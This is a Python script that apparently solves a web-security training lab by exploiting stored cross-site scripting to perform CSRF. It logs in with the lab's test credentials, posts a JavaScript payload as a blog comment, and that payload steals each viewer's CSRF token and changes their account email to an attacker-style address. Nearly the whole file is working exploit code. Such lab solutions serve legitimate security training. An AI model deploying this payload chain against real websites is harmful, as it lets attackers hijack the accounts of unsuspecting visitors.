import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name' : 'csrf'})['value']
    return csrf

def xss_attack(s, url):
    # VARIABLES
    login_url = url + '/login'
    postComment_url = url + '/post/comment'
    postId1_url = url + '/post?postId=1'

    # PAYLOAD
    payload = """    <script>
    function parseText(text){
        const re = new RegExp(/value="([A-Z,a-z,0-9]+)"/);
        const csrfArray = re.exec(text);
        var csrf = csrfArray[1];
        return csrf
    };

    function grabCsrf(url){
        req = new XMLHttpRequest;
        req.open("GET", url, false);
        req.send();
        const text = req.responseText;
        csrf = parseText(text);
        return csrf
    };

    function changeEmail(){
        var domain = document.domain;
        var domain_url = 'https://'+domain;
        var changeEmail_url = domain_url + '/my-account/change-email';
        var myAccount_url = domain_url + '/my-account';

        const csrf = grabCsrf(myAccount_url)

        var params = {
            'email' : 'youvebeenhacked@attacker.hack',
            'csrf' : csrf
        };

        var formBody = [];
        for (property in params) {
            var encodedKey = encodeURIComponent(property);
            var encodedValue = encodeURIComponent(params[property]);
            formBody.push(encodedKey + "=" + encodedValue)
        };
        formBody = formBody.join("&");

        fetch(changeEmail_url, {
            method : 'POST',
            headers : {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body : formBody
        });
    };

document.body.onload = changeEmail()
</script>"""

    # PARAMS FOR LOGIN
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }
    # LOGIN
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if 'wiener' not in r.text:
        print("[-] Could not log-in")
        sys.exit(-1)
    
    # POST COMMENT
    params = {
        'csrf' : get_csrf(s, postId1_url),
        'postId' : 1,
        'comment' : payload,
        'name' : 'hacker',
        'email' : 'h@cker',
        'website' : 'http://hack'
    }
    # POST PAYLOAD
    r = s.post(postComment_url, data=params, verify=False, proxies=proxies)
    if "Your comment has been submitted." not in r.text:
        print("[-] Error while posting the comment")
        sys.exit(-1)
    
    # CHECK IF LAB WAS SOLVED
    r = s.get(url, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" not in r.text:
        print("[-] Lab not solved")
        sys.exit(-1)
    print("[+] Congratulations! Exploit worked!")




def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].strip()

    print("[+] Lab: Exploiting XSS to perform CSRF")
    print("""[+] This lab contains a stored XSS vulnerability in the blog comments function.
    To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
    You can log in to your own account using the following credentials: wiener:peter""")

    xss_attack(s, url)


if __name__ == "__main__":
    main()